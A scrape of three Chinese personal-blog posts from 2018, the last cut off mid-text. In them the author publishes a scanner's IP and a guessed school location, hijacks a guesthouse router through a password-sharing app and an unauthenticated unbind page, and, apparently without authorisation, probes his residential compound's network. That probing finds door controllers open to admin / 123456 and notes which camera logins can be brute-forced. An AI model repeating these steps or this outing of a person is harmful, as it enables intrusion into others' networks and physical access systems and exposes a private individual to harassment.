content,date,title
"<div class=""post-body"">
<h2>
	背景
</h2>
<p>
	今天上午我在工作的时候偶然想起来博客所在的vps可能需要续费了，登录到idc的管理页面忽然发现我的小水管VPS状态为“暂停”，仔细查看到期时间为2018年10月多，这也还没到期，奇了怪了，按照惯例idc应该在操作的时候会发送提醒邮件给我，于是我找到了这样一封邮件</p><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=684"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201808/3508fa5180b23d2fbd0f0661e7e36698.png"" alt=""火狐截图_2018-08-15t04-43-49.365z.png - 大小: 33.57 KB - 尺寸: 810 x 328 - 点击打开新窗口浏览全图"" width=""810"" height=""328""></a></div>邮件的大概意思是我的服务器被暂停了，暂停的理由用黑色加粗字体标出“资源滥用：超出15%以上”，邮件发送时间为当地的2018年8月15号0点06分，也就是国内时间2018年8月15号12点06分，时差12个小时。

<p>
	这样看来应该是服务器某些应用出现了异常导致，但是现在服务器处于暂停状态，我又无法登录服务器，无法查明具体原因，所以只能发Ticket过去寻求帮助。
</p>
<p>
	于是博主我又一次施展32级基础英语能力与idc进行沟通，idc那边提供7×24小时服务，虽然是凌晨，但是idc依然在10分钟后回复了我</p><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=685"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201808/347932e4ff3feba58dabafa3035d5500.png"" alt=""火狐截图_2018-08-15t06-52-53.919z.png - 大小: 16.31 KB - 尺寸: 685 x 294 - 点击打开新窗口浏览全图"" width=""685"" height=""294""></a></div>idc告知我监控系统显示我的服务器负载过高，已经超出15%，如果我已经准备好查明原因，他们将立刻恢复服务。

<p>
	我回复Ticket说已经准备好了。
</p>
<p>
	说实话，idc的应急响应还是很到位的，大概5分钟后我的服务器恢复到正常状态，同时idc提示我尽快解决问题，否则还是会被监控系统自动暂停，并且告知他们出现的具体是什么问题他们好做记录。</p><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=686"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201808/b431f22e9edc1040ee690b7b3c874b7f.png"" alt=""火狐截图_2018-08-15t06-58-38.408z.png - 大小: 16.23 KB - 尺寸: 817 x 266 - 点击打开新窗口浏览全图"" width=""817"" height=""266""></a></div>此时已经距离IDC发出暂停警告邮件已经过去了1个小时。

<h2>
	排查
</h2>
<p>
	在服务器恢复正常状态后我迅速登录到服务器，top命令显示CPU占用已经达到80%，出现大量的httpd进程，因为我的博客是跑在apache下面，所以判断应该是博客有大量的访问请求导致。
</p>
<p>
	为了防止服务器再次被拉黑，所以我先暂停了nginx服务，让CPU先降下来，然后告知IDC我的服务器疑似遭到攻击。
</p>
<p>
	接下来我就得看看是来自哪里的攻击，拖出日志到本地，根据web访问日志基本上搞清楚了是什么问题，下面就稍微做个分析。
</p>
<h2>
	复盘
</h2>
<p>
	首先，在日志文件里面找到了ip为113.116.6.6大量连续的访问记录，确定了嫌疑IP是113.116.6.6。
</p>
<p>
	根据访问顺序判断大概是这么个流程：
</p>
<p>
	113.116.6.6 在09:45:30的时候使用IE内核浏览器打开了我博客的一篇文章，文章链接为 https://www.92ez.com/?action=show&amp;id=23345 ，这是我在2015年8月28号发布的一篇名为 “kali linux 2.0 配置GSM Sniffer环境” 的文章，主要目的是普及GSM Sniffer的知识，当时GSM Sniffer很火的时候玩的人也很多，博主也是其中一个，为了方便大家所以写的一个科普文。</p><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=687"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201808/76c6614f36b05dc3d17dd39d2a5554d6.png"" alt=""火狐截图_2018-08-15t07-16-09.621z.png - 大小: 510.92 KB - 尺寸: 973 x 581 - 点击打开新窗口浏览全图"" width=""900"" height=""538""></a></div>可能是我的博客在IE内核下面的体验不够好，这位同学在09:45:36的时候切换到使用Chrome内核的猎豹浏览器重新打开了这篇文章。

<p>
	仅仅过了不到1分钟，这位同学在09:46:19打开了另外一篇文章，文章链接 https://www.92ez.com/?action=show&amp;id=57，这一篇文章的标题“My GSM Sniffer Kit come soon.”，主要是展示了博主我在玩GSM Sniffer时候的一些成果</p><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=692"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201808/7c6b89f1c2668b4132fddcea987ae771.png"" alt=""火狐截图_2018-08-15t08-32-17.481z.png - 大小: 845.08 KB - 尺寸: 973 x 540 - 点击打开新窗口浏览全图"" width=""900"" height=""500""></a></div>这篇文章发布于2015年3月22号，距离现在应该3年半了。

<p>
	一分钟后，也就是09:47:26，这位同学又打开了一篇文章，文章链接 https://www.92ez.com/?action=show&amp;id=76，是一篇发布于2015年6月30号，标题为“玩osmocom-bb需要哪些技能？【翻译】”的文章，这篇文章翻译自osmocom.org官方网站，主要是为了说明玩osmocombb需要有一定的基础知识，否则会碰到很多问题。</p><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=693"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201808/a4f5fd8af886c06963d1dc57e1d7d4ff.png"" alt=""火狐截图_2018-08-15t08-33-13.137z.png - 大小: 83.01 KB - 尺寸: 963 x 581 - 点击打开新窗口浏览全图"" width=""900"" height=""543""></a></div>

<p>
	在09:47:56的时候，这位同学又打开了一篇文章，文章链接 https://www.92ez.com/?action=show&amp;id=23458， 是一篇发布于2017年10月24号，标题为“Ubuntu 编译 OsmocomBB 环境 [更新2017-10-24]”的文章，这篇文章的目的是为了纠正官方网站结构变更导致的资源缺失问题。</p><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=694"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201808/597dc4231542b69df0e4f553c2434a17.png"" alt=""火狐截图_2018-08-15t08-33-51.500z.png - 大小: 131.54 KB - 尺寸: 954 x 615 - 点击打开新窗口浏览全图"" width=""900"" height=""581""></a></div>

<p>
	不得不说，这位同学看文章的速度真是快，一分钟看一篇。
</p>
<p>
	在09:48:21的时候，这位同学回到了首页，然后在浏览了10秒钟后打开了 https://www.92ez.com/?action=show&amp;id=23459 这篇文章，标题为 “博客新增音乐功能的说明”</p><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=695"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201808/81ffb61f58e45251f688bdafa33b9d89.png"" alt=""火狐截图_2018-08-15t08-34-36.913z.png - 大小: 54.15 KB - 尺寸: 954 x 452 - 点击打开新窗口浏览全图"" width=""900"" height=""427""></a></div>我想应该是这位同学手抖点错了吧，他应该是要点 “Ubuntu 编译 OsmocomBB 环境 [更新2017-10-24]”才对。

<p>
	十分钟后，也就是10:01:44，这位同学直接打开了这个链接 https://www.92ez.com/config.php ，很可惜，这个链接打开是一片空白，啥也没有，但是这位同学的思路很敏锐，config.php这个名字很特殊，看来这位同学对php是略知一二的，因为网站的配置信息一般都写在这里面，说不定能爆出点儿啥，而且很多php框架都有这个文件，万一碰到了通用漏洞呢，岂不是美滋滋，但是很遗憾，没发现有价值的东西。
</p>
<p>
	很快，这位同学又发现了新的链接 https://www.92ez.com/attachment.php 这个链接是用来显示附件的，直接打开也是提示跳转首页，没卵子用</p><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=688"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201808/8d14663344947ef16e49b36198e339f7.jpg"" alt=""uuuuuuuuuuuuuu.jpg - 大小: 30.67 KB - 尺寸: 580 x 236 - 点击打开新窗口浏览全图"" width=""580"" height=""236""></a></div>

<p>
	可能是因为这位同学啥也没拿到，一怒之下祭出了他珍藏的扫描器，一阵狂扫</p><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=689"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201808/81d3ae871471c53a35a7cc493d434983.png"" alt=""微信图片_20180815155503.png - 大小: 102.21 KB - 尺寸: 815 x 788 - 点击打开新窗口浏览全图"" width=""815"" height=""788""></a></div>在10:14:37的时候这位同学使用浏览器访问了https://www.92ez.com/install.php，这个文件是很多开源的php系统常见的安装文件，有的安装完忘记删也会存在漏洞，所以这位同学以为我博客有这个漏洞，结果还是啥也没有。

<p>
	在10:17:26的时候，这位同学直接使用目录的方式访问install https://www.92ez.com/install 也没有反应，然后又打开了 https://www.92ez.com/install/install.php 结果还是一样，又打开了 https://www.92ez.com/install/install.sql 结果依然跳转到首页，哎呀，真糟糕，啥也没有拿到。
</p>
<p>
	这位同学使用了两个不同的扫描器进行扫描，一个是扫描路径的，一般是用来判断cms的类型，一种是扫描备份文件，这种扫描一直持续到12:06:15，这个时候IDC监控发现异常并且对我的服务器执行了暂停操作。
</p>
<p>
	经过将近1个小时的沟通后，也就是13:01:21服务器恢复，这位同学的扫描器还在扫，大概是去睡午觉了吧。
</p>
<p>
	一直到13:03:09的时候我手动关闭了nginx服务。
</p>
<h2>
	后记
</h2>
<p>
	虽然我不知道这位同学到底有何意图，但是从你打开的文章来看，您应该是对osmocombb很有兴趣，是因为最近短信诈骗太火了吗，导致您的认为根源在于我的博客？觉得要伸张正义为民除害对吗？
</p>
<p>
	那拜托您仔细看好了，我所有的文章都是在讨论技术问题，并没有教人如何犯罪，博主我本人也非常痛恨拿技术犯罪的人，但是您真的没有必要对我512m内存的小水管vps动手，这对您没好处，您是想从我这拿走什么呢？有什么值得您拿呢？都是一些技术文章，而且都是公开的，真的没有东西。
</p>
<p>
	您用着您的win7，跑着网上随便都能下载到的扫描器，如果你认为这就是所谓的黑客技术，这就是所谓的伸张正义，这样就能炫耀您的技术，那么呵呵，您还是好好的把书念好，好吗？
</p>
<p>
	最后还是附上一个大概的定位，不管准不准确</p><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=690"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201808/cbe19650421b3374034ab1e1b2fa1959.png"" alt=""火狐截图_2018-08-15t08-24-32.033z.png - 大小: 46.08 KB - 尺寸: 338 x 318 - 点击打开新窗口浏览全图"" width=""338"" height=""318""></a></div><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=691"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201808/6df4e0665dddd94984da68ea033c66e4.png"" alt=""火狐截图_2018-08-15t08-24-06.938z.png - 大小: 44.14 KB - 尺寸: 335 x 318 - 点击打开新窗口浏览全图"" width=""335"" height=""318""></a></div>深圳高级中学，一听就很高级

<h2>
	补充
</h2>
<p>
	巧的是在博客恢复之后不到半个小时，也就是 14:50:14 ，遭到了来自江苏南京电信网段为 180.97.35.*的目录扫描，不过这个看起来更像是一些安全网站的例行扫描，也就无所谓了</p><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=697"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201808/a4c0b5ee3b410365c45c034990e3519d.png"" alt=""屏幕截图2018081500.png - 大小: 646.95 KB - 尺寸: 1572 x 900 - 点击打开新窗口浏览全图"" width=""900"" height=""516""></a></div>
<div class=""useWarning"" style=""background-color: #f0f0f0"">
本文链接：https://www.92ez.com/?action=show&amp;id=23471 <br>
                        <b>!!! 转载请先联系non3gov@gmail.com授权并在显著位置注明作者和原文链接 !!! <a href=""https://www.92ez.com/black.html"" target=""_blank"" style=""color: #000;text-decoration: underline;background: none"">小黑屋</a> </b><br>
提示：技术文章有一定的时效性，请先确认是否适用你当前的系统环境。
</div>

<style type=""text/css"">
.useWarning a{color:#fff;background-color:#ea6f5a;border-radius:3px;padding:5px 10px;text-decoration: none;}
.tuijian{margin-top:10px;}
.tuijian a{display:block;}
.tuijian img{padding:0;margin:0;}
.tuijian a img{display:block;width:100%;}
.donateme{font-size: 14px;display:none;}
.donateme a{color: green;font-weight: bold;}
.useWarning{padding: 5px 10px;border: #c00 1px dashed;margin: 10px 0 0;color: #c00;}
</style>
</div>","KBdancer, 发表于 2018-08-15, 3:06 PM. 
发表在：
								
 ,随手记,
",IP为113.116.6.6的同学，我有话想对你说
"<div class=""post-body"">
<h2>
	前言
</h2>
<p>
	博主我每天看到那么对小情侣进进出出酒店有点小羡慕，更何况酒店里面都是各种情趣房，大圆床，啧啧.....
</p>
<p>
	但是你可知道，假如有一天，你连上酒店WiFi之后，你的手机名称就出现在了别人的手机上，这就非常的尴尬了
</p>
<h2>
	背景
</h2>
<p>
	博主是个保守的男人，家附近有个住宅房被改成了所谓的民宿，说是非法经营也不算，人家可是有营业执照的，民宿这玩意还挺火，自从开业以后生意火爆，毕竟在学校旁边，学生小情侣来来往往，其实这对博主我这种思想保守的IT男并没有实质上的影响，但是特么的有时候半夜两三点在那敲门实在是吵，要知道凌晨3点是什么时间，特么的博主我正在开心的撸代码，你们这么大声会影响到我工作你们不懂吗，真是气...
</p>
<h2>
	主题<br>
</h2>
<p>
	气的不行，博主我一怒之下翻出3年前囤下的TOTOLINK双天线超强蹭网卡，对，就是下图这玩意，真的超级好用</p><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=670"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201805/cd1850d72632040e436712f305cadef5.jpg"" alt=""wangka.jpg - 大小: 355.23 KB - 尺寸: 900 x 508 - 点击打开新窗口浏览全图"" width=""900"" height=""508""></a></div>用上无线网卡之后信号增强了不少，找到只有一格信号的目标ssid，开始猜密码，常用密码试了个遍不行，得换个思路，破解是不会破解的，一辈子都不会破解的，为了这玩意我犯不着上破解工具，既然是民宿，一定有在什么某团，某猪短租，某猪这类APP上可以定，我首先得拿到电话号码，万一wifi密码就是手机号呢？

<p>
	说干就干，打开某猪APP一搜索果然找到目标，顺利拿到手机号码</p><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=671"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201805/dc42218dd76d0c376ba0462c260a2cff.jpg"" alt=""微信图片_20180523212950.jpg - 大小: 203.7 KB - 尺寸: 1080 x 1199 - 点击打开新窗口浏览全图"" width=""810"" height=""900""></a></div><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=672"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201805/6c2d6dd66bb314cc2baee244f4841b43.jpg"" alt=""微信图片_20180523212955.jpg - 大小: 153.46 KB - 尺寸: 1080 x 768 - 点击打开新窗口浏览全图"" width=""900"" height=""640""></a></div>看了下民宿的评价还挺高，毕竟一晚才100来块，看下民宿的照片吧，看得我博主我都有点心动了<div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=673"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201805/f499956ed9cdc1a0462222dc993a0b1b.jpg"" alt=""微信图片_20180523212958.jpg - 大小: 529.89 KB - 尺寸: 1080 x 1920 - 点击打开新窗口浏览全图"" width=""507"" height=""900""></a></div>圆床情趣主题房，怪不得那么多小情侣喜欢来，是挺有情趣的...

<p>
	扯远了，咱们回来继续，拿到手机号码回来试下，发现wifi密码并不是手机号码，想到那么多人住过，我就不信wifi万能钥匙上没有。
</p>
<p>
	根据之前使用各种所谓的钥匙，最终我选择了成功率相对较高的某讯WIFI管家，管家就是管家，果然有，但是我手机wifi功能并不强大，于是把wifi分析仪开启来，来回走动，终于找到一个信号比较好的点连了上去，然后使用wifi密码查看器顺利拿到wifi密码，最终我用电脑连上了wifi。
</p>
<p>
	接下来就是登录路由器的环节了，现在的智能路由嘛，都喜欢搞什么一键配置，大家都搞的差不多，管理密码就是wifi密码，我就这样进去了路由器管理</p><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=674"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201805/c677b275fa07ae3642411ee0634d7ab1.png"" alt=""微信图片_20180523213720.png - 大小: 131.11 KB - 尺寸: 1128 x 774 - 点击打开新窗口浏览全图"" width=""900"" height=""618""></a></div>但是这有什么用呢，别着急，好戏还在后头，看到右下角有个app，声称可以远程管理路由器，这个我喜欢，下载app，注册账号一条龙，然后到了关键的添加设备了<div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=675"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201805/b77a27f4ee2161e2e129a88123ff54a4.jpg"" alt=""weibangding.jpg - 大小: 145.27 KB - 尺寸: 1080 x 1920 - 点击打开新窗口浏览全图"" width=""507"" height=""900""></a></div>点加号提示此设备已被'手机用户_xxxx'绑定了。

<p>
	EXO ME ????被绑定了？那就是被刚刚拿到的那个手机号码绑了呗，唉，搞了半天结果没戏，在翻看路由器管理后台的时候发现了一个神奇的链接，请看路由器管理界面那张图的右边红色框框，点击一下，打开了一个更加神奇的页面</p><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=676"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201805/bbe08dc2bd0c14d9b4dfabf2f1ebca8c.png"" alt=""屏幕截图 2018-05-23 21.05.10.png - 大小: 94.05 KB - 尺寸: 1000 x 905 - 点击打开新窗口浏览全图"" width=""900"" height=""815""></a></div>这特么完全不用登录的吗（黑人问号脸.jpg）可是明明写的是登录超时，请重新登录，而且管理者的账号就直接暴露了<div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=677"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201805/45948c7619a5f5dfdbc71ba5a9536de0.jpg"" alt=""top.jpg - 大小: 19.62 KB - 尺寸: 666 x 62 - 点击打开新窗口浏览全图"" width=""666"" height=""62""></a></div>更变态的是下面那些按钮都是可以直接操作的，既然可以直接修改，那博主我就不客气了，直接解绑！解绑成功<div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=678"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201805/91a2d708a9a3c5313eac03abb542f837.png"" alt=""屏幕截图 2018-05-23 21.06.09.png - 大小: 132.46 KB - 尺寸: 1163 x 767 - 点击打开新窗口浏览全图"" width=""900"" height=""594""></a></div>连个手机验证码都不需要的吗？这特么不是漏洞算我输，就是一个大大的漏洞。

<p>
	OK，既然解绑了，那就直接绑定到我的账号下吧</p><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=679"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201805/e81f2d8e9be12733b8cea25709b132e8.jpg"" alt=""bangding.jpg - 大小: 416.73 KB - 尺寸: 1080 x 1920 - 点击打开新窗口浏览全图"" width=""507"" height=""900""></a></div>至此，这个路由器已经被博主我接管，以后看你们再大半夜吵影响我的工作，就拉黑你们的MAC，断你们的网。

<h2>
	总结
</h2>
<p>
	你的路由听我的。
</p><div class=""useWarning"" style=""background-color: #f0f0f0"">
本文链接：https://www.92ez.com/?action=show&amp;id=23470 <br>
                        <b>!!! 转载请先联系non3gov@gmail.com授权并在显著位置注明作者和原文链接 !!! <a href=""https://www.92ez.com/black.html"" target=""_blank"" style=""color: #000;text-decoration: underline;background: none"">小黑屋</a> </b><br>
提示：技术文章有一定的时效性，请先确认是否适用你当前的系统环境。
</div>

<style type=""text/css"">
.useWarning a{color:#fff;background-color:#ea6f5a;border-radius:3px;padding:5px 10px;text-decoration: none;}
.tuijian{margin-top:10px;}
.tuijian a{display:block;}
.tuijian img{padding:0;margin:0;}
.tuijian a img{display:block;width:100%;}
.donateme{font-size: 14px;display:none;}
.donateme a{color: green;font-weight: bold;}
.useWarning{padding: 5px 10px;border: #c00 1px dashed;margin: 10px 0 0;color: #c00;}
</style>
</div>","KBdancer, 发表于 2018-05-23, 10:04 PM. 
发表在：
								
 ,信息安全,
								
,  ,攻击测试,
								
,  ,原创,
								
,  ,隐私保护,
",我是如何将酒店的路由器强制绑定到我的账号下
"<div class=""post-body"">
<h2>
	前言
</h2>
<p>
	博主从小就是一个喜欢把事情简单化的男人，但是现实总是在不经意间给你太多的惊喜，比如不停的搬家。
</p>
<p>
	博主从大学毕业到现在前前后后凑足了10次搬家运动，终于在第10次搬家的时候搬进了真正属于自己的房子。
</p>
<p>
	15年底趁着房价最低的时候捡了个漏，一咬牙买下一套两房半小居室，17年交房装修，终于在18年<span style=""white-space:normal;"">初计划</span>搬进去住，博主我终于再也不用搬家了，心情愉悦，住进去之后就开始忙乎各种琐事，所以这几个月是非常的繁忙，博客也更得少，不过内容都在笔记里面，慢慢更。
</p>
<p>
	博主所购的小区对自己的智能化系统宣传的很到位，所以闲下来的时候博主我就对小区的安防系统进行一次简单的渗透，轻松拿下各种安防系统，这篇文章就来详细的说明一下。
</p>
<h2>
	准备
</h2>
<p>
	开始之前，博主需要对环境进行一个简单的描述，以便大家能够在脑海中脑补一下整个渗透测试的过程，算是博主在线下渗透的一个例子吧，往后还有对整个商场各种店铺各种的渗透过程，都会一一讲解。
</p>
<p>
	好了，废话就不多说了，咱们既然是对网络系统进行渗透测试，自然是得有一个入口，那这个入口在哪找呢？
</p>
<p>
	大家都知道，一般小区这种内部的网络都是不直接连接到外网的，如果连那也是做了隔离，单独有一个跳板来做转发，这样相对比较安全，但是正常情况都是没外网的，这种局域网系统有两个突出的特点。
</p>
<p>
	第一点就是维护人员过分的信任了内网的机器，认为只要不连接外网就基本上没事，高枕无忧，真是图样图森破。
</p>
<p>
	第二点就是没有安全防护软件，就算有，那也是病毒特征库千百年不会更新，跟摆设一样，没有外网更新个毛线，这一点后面有机器可以验证。
</p>
<p>
	所以具备这两个特点的内部局域网是非常脆弱的，只要找到一个入口，基本上整个网络就game over了，这个入口就非常的好找了。
</p>
<p>
	众所周知，现在的小区都是家家户户安装了一个可视对讲机，这玩意有时候挺好用，比如有客人来了，楼下大门门禁可以用这玩意远程开门，可以语音对讲，可以看到对方的脸，还可以录音录像，不仅如此，还能跟家里的烟雾报警器连起来，发生火灾直接通知物业并发出警报，还可以呼叫其他住户来一个免费的局域网语音聊天，功能可以说是相当丰富了。
</p>
<p>
	你猜的没错，咱们整个渗透测试过程就从这个设备开始，先来看看咱们这个厉害的可视对讲机长什么样</p><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=641"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201805/d9ee139a63e2108b9f5d698ae1054457.jpg"" alt=""微信图片_20180521153517.jpg - 大小: 95.61 KB - 尺寸: 900 x 508 - 点击打开新窗口浏览全图"" width=""900"" height=""508""></a></div>通过缺省弱口令进入工程模式，拿到ip地址，网关还有服务器地址<div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=642"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201805/258a65c781fa1fe68c4a37c538b8d3af.jpg"" alt=""p80312-171124.jpg - 大小: 145.86 KB - 尺寸: 824 x 439 - 点击打开新窗口浏览全图"" width=""824"" height=""439""></a></div><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=643"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201805/f33f3e5b4c9484c8eca863c8a7f2c5bc.jpg"" alt=""p80312-171153.jpg - 大小: 484.84 KB - 尺寸: 900 x 563 - 点击打开新窗口浏览全图"" width=""900"" height=""563""></a></div>拆下对讲机<div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=644"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201805/457cc84da90b8cccff681919e6a7d530.jpg"" alt=""p80319-164923.jpg - 大小: 316.73 KB - 尺寸: 900 x 681 - 点击打开新窗口浏览全图"" width=""900"" height=""681""></a></div>我擦嘞，这网线也太短了吧，上工具<div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=646"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201805/df4a006dc9534bc69cac32035d73ac06.jpg"" alt=""p80319-165232.jpg - 大小: 317.59 KB - 尺寸: 900 x 619 - 点击打开新窗口浏览全图"" width=""900"" height=""619""></a></div><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=647"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201805/75e3f703e1f8be6bca5cebdace9f431f.jpg"" alt=""p80319-171804.jpg - 大小: 608.52 KB - 尺寸: 900 x 1057 - 点击打开新窗口浏览全图"" width=""767"" height=""900""></a></div>把网线进行延长方便接交换机、路由器、笔记本之类的设备，最后确认下通讯是否正确<div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=648"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201805/45ad78e96d252b8ba52eb53708306291.jpg"" alt=""p80319-172001.jpg - 大小: 709.62 KB - 尺寸: 900 x 1197 - 点击打开新窗口浏览全图"" width=""677"" height=""900""></a></div>基本准备工作搞定之后就开始进行入侵渗透了。

<h2>
	扫描
</h2>
<p>
	根据之前撸光猫内网的经验，这里的IP地址肯定是固定的，而且跟住户号是绑定的，如果使用自己的iP地址进行测试，万一出啥问题那不是非常的尴尬，既然现在很多业主都还没有入住，那么IP地址池也有很多的空闲，就使用其他住户的IP地址吧，只要不冲突就行，说干就干，上装备：
</p>
<p>
	一个充电宝、一个路由器、一台笔记本</p><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=649"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201805/d3187104ad370442f27aaa0423a8ef27.jpg"" alt=""微信图片_20180521155613.jpg - 大小: 552.77 KB - 尺寸: 900 x 1107 - 点击打开新窗口浏览全图"" width=""732"" height=""900""></a></div><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=650"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201805/0fc16177df01f8ab0100d6a611a085f4.jpg"" alt=""微信图片_20180521155618.jpg - 大小: 635.75 KB - 尺寸: 900 x 1026 - 点击打开新窗口浏览全图"" width=""790"" height=""900""></a></div><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=651"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201805/bef572f11804cee6c46319fbc6ec1446.jpg"" alt=""微信图片_20180521155623.jpg - 大小: 819.82 KB - 尺寸: 900 x 1270 - 点击打开新窗口浏览全图"" width=""638"" height=""900""></a></div>通电后设置路由器的固定IP<div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=652"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201805/0a77fa28a28681d29483038ff8437fa0.png"" alt=""screenshot from 2018-05-18 19-06-00.png - 大小: 68.79 KB - 尺寸: 712 x 500 - 点击打开新窗口浏览全图"" width=""712"" height=""500""></a></div>这样笔记本通过无线wifi就可以对IP段进行扫描了，我这使用的扫描软件是Angry IP Scanner，图形界面用起来很爽，而且速度也快<div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=653"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201805/ae1bac9f68e9744d22e5c9932faa9f45.png"" alt=""screenshot from 2018-05-18 22-10-17.png - 大小: 297.48 KB - 尺寸: 1366 x 768 - 点击打开新窗口浏览全图"" width=""900"" height=""507""></a></div>对192.165.0.1/16进行扫描发现存活主机1256个，为了对IP地址快速分类，将存活的IP地址全部导出，编写python脚本对ip的http响应头进行分类，最终分为下面的这几类：

<h3>
	第一类
</h3>
<pre class=""brush:bash;"">mini_httpd/1.19 19dec2003</pre>
这一类机器是所有的门禁机，包含了住户家里的对讲机，楼栋大堂的门禁机，车库电梯的门禁机，小区大门的门禁机，通过ip地址以及admin / 123456弱口令可以远程控制，同时telnet也可以连接，管理页面功能很全，包括修改密码，控制开门时间，控制门禁机密码，呼叫住户，呼叫物业中心，恢复出厂设置等等，功能丰富，界面如下<div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=654"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201805/773bd156cc66d4dcbeca1a3bd4c07320.png"" alt=""2018-05-21 16-15-41 的屏幕截图.png - 大小: 122.37 KB - 尺寸: 916 x 583 - 点击打开新窗口浏览全图"" width=""900"" height=""573""></a></div><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=655"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201805/d3a5901c9ea2b273c6c63d9e6297f2fa.png"" alt=""屏幕截图 2018-04-16 11.02.12.png - 大小: 88.98 KB - 尺寸: 901 x 503 - 点击打开新窗口浏览全图"" width=""900"" height=""503""></a></div>
<h3>
	第二类
</h3>
<pre class=""brush:bash;"">DNVRS-Webs
Hikvision-webs/ 
App-webs/     </pre>
<p>
	这三种都是海康威视的监控探头，登录界面有以下几种</p><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=656"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201805/49e2f475f8da2e3cc4390591ab29ff30.png"" alt=""2018-05-21 16-26-44 的屏幕截图.png - 大小: 213.71 KB - 尺寸: 1116 x 661 - 点击打开新窗口浏览全图"" width=""900"" height=""534""></a></div><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=657"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201805/6e33f3c69253015d3d6177d436c23d1b.png"" alt=""2018-05-21 16-33-36 的屏幕截图.png - 大小: 98.26 KB - 尺寸: 1116 x 661 - 点击打开新窗口浏览全图"" width=""900"" height=""534""></a></div><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=658"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201805/ec8018b354ad0da8e3b8722ac83ada79.png"" alt=""2018-05-21 16-48-21 的屏幕截图.png - 大小: 117.88 KB - 尺寸: 1335 x 704 - 点击打开新窗口浏览全图"" width=""900"" height=""475""></a></div>只有中间那种可以无限次输错密码进行爆破，其他两种都是输错五次就锁定

<h3>
	第三类
</h3>
<pre class=""brush:bash;"">Net Keybord-Webs</pre>
<p>
	这是一个网络键盘，通常用于操作监控的云台转动，比如球机的操作杆，登录界面</p><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=659"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201805/ac6172e671f08f8a35287131ded98754.png"" alt=""2018-05-21 16-32-57 的屏幕截图.png - 大小: 34.85 KB - 尺寸: 1116 x 661 - 点击打开新窗口浏览全图"" width=""900"" height=""534""></a></div>密码输错6次就锁定。

<h3>
	第四类
</h3>
<pre class=""brush:bash;"">Boa/0.94.13</pre>
<p>
